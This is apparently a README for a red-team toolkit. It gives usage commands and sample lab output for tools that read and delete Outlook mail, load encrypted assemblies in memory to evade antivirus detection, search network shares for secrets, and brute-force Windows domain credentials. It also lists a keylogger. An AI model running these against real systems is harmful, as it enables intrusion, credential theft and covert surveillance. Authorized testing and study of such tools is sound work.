# RTUtils

Repository of random tool / script used during RT / PT

## SharpOutlook

C# .NET Program to list, read and delete emails through Outlook

### Example

```
SharpOutlook.exe -a list -f "[Unread] = True"

ID:             00000000900E6692258C7949975EBE7BFB017AEF07006297EEE9A65EA44D9C1C8DC1A755F24200000000000E00006297EEE9A65EA44D9C1C8DC1A755F24200000000040C0000
From:           website@evilcorp.local
To:             Elliot
CC:
Subject:        Help request from - Test


SharpOutlook.exe -a read -i 00000000900E6692258C7949975EBE7BFB017AEF07006297EEE9A65EA44D9C1C8DC1A755F24200000000000E00006297EEE9A65EA44D9C1C8DC1A755F24200000000040C0000

ID:             00000000900E6692258C7949975EBE7BFB017AEF07006297EEE9A65EA44D9C1C8DC1A755F24200000000000E00006297EEE9A65EA44D9C1C8DC1A755F24200000000040C0000
From:           website@evilcorp.local
To:             Elliot
CC:
Subject:        Help request from - Test
Body:
This is a test


SharpOutlook.exe -a delete -i 00000000900E6692258C7949975EBE7BFB017AEF07006297EEE9A65EA44D9C1C8DC1A755F24200000000000E00006297EEE9A65EA44D9C1C8DC1A755F24200000000040C0000

Deleted
```



## AssemblyLoader

C# .NET Program to serialize a .NET program into a base64 string encrypted that then will be loaded in memory, allowing to specify arguments, in order to bypass the signature-based detection of AVs

### Example

```
C:\>.\Serializer.exe SharpUp.exe
Copy the content of serialised.txt into the variable "assembly" of Loader
C:\>.\Loader.exe audit

=== SharpUp: Running Privilege Escalation Checks ===

[*] In medium integrity but user is a local administrator- UAC can be bypassed.

[*] Audit mode: running all checks anyway.
```


## SharpFind

C# .NET for finding file name and keyword

### Usage

```
C:\>.\SharpFind.exe
For searching by name: SharpFind.exe name {directory} {name} {extension} [outputFile]
For searching by keyword: SharpFind.exe keyword {directory} {keyword} {extension} [outputFile]

- directory: C:\path\to\directory\ or \\path\to\directory\ or LocalShares (to search into all local network computers [net view]) or LogicalDisk (to search into all logical disks)
- name and keyword: case insensitive
- extension: *.* or *.txt
```
### Example
```
C:\>.\SharpFind.exe keyword LocalShares secret *.*
[*] Getting Shares...
\\EVILCORPVM01\ADMIN$
\\EVILCORPVM01\C$
\\EVILCORPVM01\IPC$
\\EVILDC\NETLOGON
\\EVILDC\SYSVOL
\\EVILDC\Users
[+] \\EVILDC\Users\elliot\Desktop\shared\keyword.doc
[+] \\EVILDC\Users\elliot\Desktop\shared\keyword.docx
[+] \\EVILDC\Users\elliot\Desktop\shared\keyword.pdf
[+] \\EVILDC\Users\elliot\Desktop\shared\keyword.xls
[+] \\EVILDC\Users\elliot\Desktop\shared\keyword.xlsx

C:\ >.\SharpFind.exe name LocalShares findme *.*
[*] Getting Shares...
\\EVILCORPVM01\ADMIN$
\\EVILCORPVM01\C$
\\EVILCORPVM01\IPC$
\\EVILDC\NETLOGON
\\EVILDC\SYSVOL
\\EVILDC\Users
[+] \\EVILDC\Users\elliot\Desktop\shared\AnotherDir\findme.txt
```
## SharpWinLogin

C# .NET for brute-forcing Windows Domain Credential 

### Usage

```
C:\>.\SharpWinLogin.exe
SharpWinLogin.exe {usernameList} {passwordList} {lockoutThreshold} [outputFile]
For searching by keyword: SharpFind.exe keyword {directory} {keyword} {extension} [outputFile]

- usernameList: C:\\path\\to\\usernameList.txt or "username1,username2" or auto (to retrieve the username list from Domain Controller)
- passwordList: C:\\path\\to\\passwordList.txt or "password1,password2"
- lockoutThreshold: n or 0 (for no lockout threshold)
```
### Example
```
C:\>.\SharpWinLogin.exe “locked,angela” “locked,angela1990,test” 0
User locked is disabled
[+] Found credentials angela:angela1990

C:\ >.\SharpWinLogin.exe auto “angela1234,test” 0
User locked is disabled
[+] Found credentials angela:angela1234
```

## Trakker

C# .NET simple Keylogger
